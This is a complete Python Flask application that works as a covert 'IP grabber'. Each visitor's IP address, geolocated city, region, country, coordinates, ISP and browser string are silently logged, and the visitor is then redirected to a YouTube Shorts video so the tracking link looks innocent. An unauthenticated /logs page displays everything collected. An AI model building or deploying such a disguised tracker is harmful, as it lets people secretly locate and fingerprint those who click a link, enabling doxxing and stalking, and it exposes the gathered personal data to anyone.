from flask import Flask, request, redirect
import requests
from datetime import datetime
import os

app = Flask(__name__)

# This will store logs in memory as a fallback
temp_logs = []


def get_location(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        return {
            "ip": ip,
            "city": data.get("city"),
            "region": data.get("region"),
            "country": data.get("country"),
            "location": data.get("loc"),
            "isp": data.get("org")
        }
    except Exception as e:
        return {
            "ip": ip,
            "city": None,
            "region": None,
            "country": None,
            "location": None,
            "isp": None
        }


@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    info = get_location(ip)

    log_entry = (
        f"{datetime.now()} | IP: {info['ip']} | "
        f"City: {info['city']} | Region: {info['region']} | "
        f"Country: {info['country']} | Location: {info['location']} | "
        f"ISP: {info['isp']} | Device: {user_agent}"
    )

    try:
        with open("logs.txt", "a") as file:
            file.write(log_entry + "\n")
    except:
        temp_logs.append(log_entry)

    print(log_entry)
    return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")


@app.route('/logs')
def show_logs():
    log_content = ""
    if os.path.exists("logs.txt"):
        with open("logs.txt", "r") as file:
            log_content = file.read()
    else:
        log_content = "\n".join(temp_logs)

    return f"<pre>{log_content}</pre>"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
